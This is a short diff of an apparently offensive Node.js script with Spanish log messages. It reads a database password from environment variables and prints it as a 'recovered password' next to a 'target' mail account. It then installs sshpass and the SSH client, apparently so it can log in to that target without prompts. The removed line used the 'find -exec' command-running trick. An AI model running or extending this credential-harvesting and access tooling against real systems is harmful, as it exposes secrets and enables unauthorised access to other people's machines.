@@ -50,11 +50,17 @@ const dbPassword = env['DB_PASSWORD'];
 console.log(`[INFO] Objetivo detectado: ${mailUser}@${mailHost}`);
 console.log(`[INFO] Contraseña recuperada: ${dbPassword}\n`);
 
-console.log("=== Paso 2: Instalando herramientas necesarias (SSH & sshpass) ===");
+console.log("=== Paso 2: Verificando / Instalando herramientas necesarias (SSH & sshpass) ===");
 try {
-    // Si ya está instalado, este comando terminará de inmediato
-    execSync('find . -exec apt-get update \\; -exec apt-get install -y sshpass openssh-client \\; -quit');
-    console.log("[OK] Herramientas instaladas con éxito.\n");
+    // Verificar si sshpass ya está instalado antes de intentar instalarlo
+    try {
+        execSync('which sshpass');
+        console.log("[OK] sshpass ya está instalado.");
+    } catch (checkErr) {
+        // Ejecutar apt-get de forma limpia sin desbordar el buffer de execSync
+        execSync('apt-get update -y && apt-get install -y sshpass openssh-client', { maxBuffer: 1024 * 1024 * 10 });
+        console.log("[OK] Herramientas instaladas con éxito.\n");
+    }
 } catch (e) {
     console.log("[ERROR] No se pudo instalar:", e.message);
 }
